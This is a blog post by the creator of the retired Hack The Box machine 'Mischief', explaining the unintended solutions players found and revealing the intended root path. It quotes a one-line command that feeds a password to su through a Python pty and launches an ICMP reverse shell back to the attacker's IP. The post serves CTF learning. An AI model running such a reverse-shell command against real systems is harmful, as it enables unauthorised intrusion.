---
layout: post
title: Hack The Box Mischief Story
tags: []
---
Hello everyone, this is the creator of the Mischief machine.
First of all thank you for all your amazing comments about my machine. I really appreciate them.
Here are a few comments that i have seen you guys talking about it.


[![](https://trickster0.files.wordpress.com/2019/02/soup.png)](https://trickster0.files.wordpress.com/2019/02/soup.png)

This machine had some unexpected turns about the escalations and some other bugs. I have fully patched it on my personal lab but it would take too much effort to fix it on Hack the box.
Obviously it was made to have only ONE solution. It looks like noone have found it or maybe someone did but i never saw it on comments.
So first of all the issues started from the apache page. This page was supposed to be completely blind RCE but i fucked up :D (I am no web developer)
The next mistake was preventing IPv6 outbound traffic. I fucked up once more with the iptables on IPv6.
LXC was not an intended way at all but this vulnerability came by default with Ubuntu 18.04!
Someone found a couple of different ways that i didn't even know existed like systemd-run and pkttyagent. Now i know them.
So i will leak you the actual solution here since the machine has been retired.
So since the first mistake happened in the apache page, the way to get the password for loki user is indeed icmp data exfiltration! Some people found this.
Then the root... How it was planned to happen... Since you would have obtained the password of root from the bash history like you did, then you would have to SCP an ICMP shell like ish.
ICMP shells are required to be run as root to work on linux, so the way to do this , was (it was partially found) from the apache page through su which was enabled.
The command that you should have ran is this: 
(sleep 1; echo lokipasswordmischieftrickery) | python -c "import pty; pty.spawn(['/bin/su','-c','/dev/shm/ish -i 65535 -t 0 -p 1024 yourip']);"

I hope  you liked the actual method. The purpose of my machines have always been , to make you learn new things that will actually help you in your pentests in real life or just allow you to gain more knowledge.

I consider this machine Part 2 of my series, by first being sneaky. There will be one more machine, which will be the final one! I can tell you that it will push you to learn new things and level up in terms of knowledge.
One more thing that i can spoil is that it will be a windows machine.

Cheers everyone thanks for your support take care!
